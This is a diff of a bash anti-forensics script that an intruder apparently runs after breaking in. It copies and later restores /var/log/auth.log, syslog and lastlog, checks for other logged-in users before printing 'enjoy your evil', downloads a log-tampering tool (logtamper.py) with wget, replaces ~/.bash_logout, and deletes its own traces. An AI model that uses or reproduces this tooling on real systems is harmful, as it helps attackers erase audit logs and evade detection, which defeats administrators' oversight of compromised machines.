@@ -48,32 +48,36 @@ flag="12412sdf"
 
 function _bak {
   if [ -f $1 ];then
-    cp -v $1 /tmp/  2>/dev/null 1>> $index_f
+    cp -v $1 /tmp/  2>/dev/null 
+    echo $1 >> $index_f
   fi
 }
 
 function _resume {
-  eval $(cat $index_f | awk  -F "'" '{ print "cp -v ", $4, $2 }' )
+  for i in $(cat $index_f);
+  do
+    cp -v $i /var/log/ ;
+  done
 }
 
-function glog {
-    echo "${ColorLightGreen}[!]${REST} ${ColorLightBlue}$* ${REST}"
+function gglog {
+    echo -e "${ColorLightGreen}[!]${REST} ${ColorLightBlue}$* ${REST}"
 }
-glog "collection info for clear"
+gglog "collection info for clear"
 
 last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
 if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
-    glog "warnning user is logined in !!!! , so exit ";
+    gglog "warnning user is logined in !!!! , so exit ";
     ByeHack;
 else
-    glog ${UNDERLINE}" safe ! -- enjoy your evil "
+    gglog ${UNDERLINE}" safe ! -- enjoy your evil "
 fi
 
 _bak /var/log/auth.log;
 _bak /var/log/syslog;
 _bak /var/log/lastlog;
 
-echo "${ColorLightGreen}[Good]${REST} ${ColorLightCyan} ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
+gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
 
 function CL {
     wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
@@ -90,6 +94,8 @@ function ByeHack {
   mv /tmp/_bash_out ~/.bash_logout
   CL
   _resume;
+  rm $my_ips;
+  rm $index_f;
 }
 
 
